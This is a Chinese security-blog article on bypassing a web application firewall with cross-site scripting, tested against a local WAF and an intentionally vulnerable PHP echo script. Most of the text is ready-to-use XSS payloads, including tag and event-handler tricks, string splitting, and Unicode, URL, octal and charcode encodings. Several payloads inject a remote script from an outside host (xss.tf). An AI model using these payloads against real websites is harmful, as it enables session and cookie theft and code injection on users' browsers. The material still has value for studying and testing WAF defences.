# 测试WAF来学习XSS姿势

阅读量 **451633**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-04-10 10:32:34

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t0194774ed7732d55d3.png)

## 0x00 搭建环境

本地搭建测试waf测试，xss相关防护规则全部开启。

![](https://p4.ssl.qhimg.com/t015487e91477aa6616.png)

## 0x01 Self-Xss绕过

测试脚本

    
    
      <?php   
        $input = @$_REQUEST["xss"];
        echo "<div>".$input."</div>"
      ?>

首先思路就是一些被waf遗漏的标签，暂时不考虑编码或者拼接字符串这类思路，我们直接拿来测试。

<video src=1 onerror=alert(/xss/)>绕过。

![](https://p1.ssl.qhimg.com/t018f4d9d519a01b185.png)

类似的标签还有<audio src=x onerror=alert(/xss/)>

![](https://p2.ssl.qhimg.com/t01efb3145f1177fc36.png)

除此之外以下几个payload都可以绕过。

    
    
      <body/onfocus=alert(/xss/)>
      <details open ontoggle=alert(/xss/)>
      <button onfocus=alert(/xss/) autofocus>

利用伪协议

waf拦截

![](https://p5.ssl.qhimg.com/t01a38df7801390d506.png)

加上一个xmlns属性即可绕过

![](https://p0.ssl.qhimg.com/t018e8fb0150b09d4af.png)

实际上，我测试的waf是免费使用的，所以有些厂商可以象征性的取一些样本，拦截一下常见的标签，如果你购买了厂商的高级服务，那我们绕过就有难度，然而大多数网站还是使用免费版的多。

## 拼接字符类

拼接字符串的话，一般把关键字拆分成几个字符串，再拼接执行，结合top,concat之类的。

###  top对象

top输出字符

![](https://p3.ssl.qhimg.com/t010b43d12db4539945.png)

或者打印cookie

![](https://p4.ssl.qhimg.com/t015b4940363b4eb33e.png)

top可以连接对象以及属性或函数，那么我们可以做到很多，例如:

直接top连接一个alert函数

![](https://p3.ssl.qhimg.com/t015e5dc5b21fe07333.png)

<details open ontoggle=top.alert(1)>也可以绕过waf

![](https://p3.ssl.qhimg.com/t01df91970f8a049c74.png)

top[‘alert’](1)也可弹窗，但waf拦截

![](https://p0.ssl.qhimg.com/t01393acbe0c06f4d5d.png)

绕过的话，很简单用prompt方法或者confirm都可以

<details open ontoggle=top[‘prompt’](1)>

![](https://p0.ssl.qhimg.com/t019a275ef352d7e157.png)

如果我说一定要用alert的话就要用到接字符串了。

<details open ontoggle=top[‘al’%2b’ert’](1)> %2b为url编码的+

![](https://p2.ssl.qhimg.com/t0146c119c2f782b9f5.png)

eval函数执行

<details open ontoggle=top.eval(‘ale’%2B’rt(1)’) >

![](https://p0.ssl.qhimg.com/t010103c68c291a2b80.png)

eval直接用也可以弹

<details open ontoggle=eval(‘alert(1)’) >

![](https://p5.ssl.qhimg.com/t01d86157e3c832beda.png)

这里为什么说到eval呢？因为如果eavl不拦截的话，我们可以测试各种编码，当然这是在牺牲长度的前提下。

例如： Unicode编码

<details open
ontoggle=eval(‘\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029’) >

![](https://p4.ssl.qhimg.com/t01634484725d179ce2.png)

其他：

Base64编码：  
<details open ontoggle=eval(atob(‘YWxlcnQoMSk=’)) >  
eval拦截的话，可以试试，把 e Unicode编码  
<details open ontoggle=\u0065val(atob(‘YWxlcnQoMSk=’)) >  
url编码：  
<details open ontoggle=%65%76%61%6c(atob(‘YWxlcnQoMSk=’)) >  
url编码：  
<details open ontoggle=eval(‘%61%6c%65%72%74%28%31%29’) >  
JS8编码：  
<details open ontoggle=eval(‘\141\154\145\162\164\50\61\51’) >  
Ascii码绕过：  
<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))
>  
其他自测

引用外部url，运用基于DOM的方法创建和插入节点把外部JS文件注入到网页。

<details open
ontoggle=eval(“appendChild(createElement(‘script’)).src=’http://xss.tf/eeW'”)
>

![](https://p5.ssl.qhimg.com/t01cb1b400124573a02.png)

url编码

<details open
ontoggle=eval(%61%70%70%65%6e%64%43%68%69%6c%64%28%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%29%2e%73%72%63%3d%27%68%74%74%70%3a%2f%2f%78%73%73%2e%74%66%2f%65%65%57%27)
>

![](https://p0.ssl.qhimg.com/t015ab1d79776d3c4c2.png)

###  window对象

window和top类似，比如： <img src=x onerror=window.alert(1) >

拼接一样的 <img src=x onerror=window[‘al’%2B’ert’](1) >

其他操作，参照上一章。

通过赋值，也是我们常见的，看个例子：

<img src=x onerror=_=alert,_(/xss/) >  
<img src=x onerror=_=alert;_(/xss/) >  
<img src=x onerror=_=alert;x=1;_(/xss/) >

![](https://p2.ssl.qhimg.com/t013ffc9e3ddb931102.png)

短一点的<body/onfocus=_=alert,_(123)>

![](https://p3.ssl.qhimg.com/t01a2d30932b4908d0d.png)

函数赋值，也比较常见

<body/onfocus=”a=alert,a`/xss/`”>

###  concat()

concat方法在实际应用中，不仅仅可以用于连接两个或多个数组，还可以合并两个或者多个字符串。

![](https://p1.ssl.qhimg.com/t0125c2a074a2adf41f.png)

例如： <iframe onload=location=’javascript:alert(1)’>拦截

![](https://p0.ssl.qhimg.com/t017239579954d20695.png)

使用concat来拼接字符串javascript:alert(1)

<iframe onload=location=’javascri’.concat(‘pt:aler’,’t(1)’)>

![](https://p1.ssl.qhimg.com/t01d3c2e0979fe1c60e.png)

假设concat没被过滤，可以用来干扰waf判断

<iframe
onload=s=createElement(‘script’);body.appendChild(s);s.src=’http://x’.concat(‘ss.tf/’,’eeW’);
>

![](https://p0.ssl.qhimg.com/t01473beebaa29a9a3d.png)

如果concat被拦截，可以尝试编码

<iframe
onload=s=createElement(‘script’);body.appendChild(s);s.src=’http://x’.\u0063oncat(‘ss.tf/’,’eeW’);
>

###  join()

join函数将数组转换成字符串

![](https://p2.ssl.qhimg.com/t0145e6a3e1259c863d.png)

那么我们可以将一些关键字作为数组，再用join连接，转化成字符串。

<iframe onload=location=[‘javascript:alert(1)’].join(”)>  
<iframe onload=location=[‘java’,’script:’,’alert(1)’].join(”)>

![](https://p3.ssl.qhimg.com/t015432e766ca22b899.png)

###  document.write

document.write向页面输出内容。

![](https://p0.ssl.qhimg.com/t01cbbb729878afb413.png)

![](https://p4.ssl.qhimg.com/t016cfd2c1c2e27390a.png)

<script>alert(1)</script>Ascii编码

<body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))
>

![](https://p0.ssl.qhimg.com/t01570502a41424f7bf.png)

也可以直接插入js代码<sCrIpt srC=http://xss.tf/eeW></sCRipT>

<body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,104,116,116,112,58,47,47,120,115,115,46,116,102,  
47,101,101,87,62,60,47,115,67,82,105,112,84,62))>

![](https://p1.ssl.qhimg.com/t015f36e651b9e964d6.png)

###  setTimeout()

setTimeout(‘要执行的代码’)

![](https://p2.ssl.qhimg.com/t01854f73f5db0b23cf.png)

alert(1)编码，即可轻松绕过waf

<svg/onload=setTimeout(‘\141\154\145\162\164\50\61\51’)>  
<svg/onload=\u0073etTimeout(‘\141\154\145\162\164\50\61\51’)>  
<svg/onload=setTimeout(‘\x61\x6C\x65\x72\x74\x28\x31\x29’)>  
<svg/onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>

![](https://p5.ssl.qhimg.com/t01eb3b6fa9ec59abd2.png)

## 杂谈

结合一些分割组合函数，再进行编码，尝试绕过waf，查看是否调用jquery框架。我也是刚刚学xss不久，难免有所出错，希望师傅指正。

感兴趣的同学可以关注Github项目: https://github.com/S9MF/Xss_Test

## 参考致谢

https://secvul.com/topics/259.html

>
> [【XSS】绕过WAF的姿势总结](http://vinc.top/2014/11/13/%e7%bb%95%e8%bf%87waf%e7%9a%84%e5%a7%bf%e5%8a%bf%e6%80%bb%e7%bb%93/)

https://www.t00ls.net/viewthread.php?tid=46056&highlight=攻破黑市之拿下吃鸡DNF等游戏钓鱼站群

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **肚妖啊** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/176185](/post/id/176185)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [xss](/tag/xss)
  * [Web安全](/tag/Web安全)
  * [waf](/tag/waf)

 **+1** __23赞

 __收藏

![](https://p4.ssl.qhimg.com/t01b9d8d0bcdba48120.jpg) 肚妖啊

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

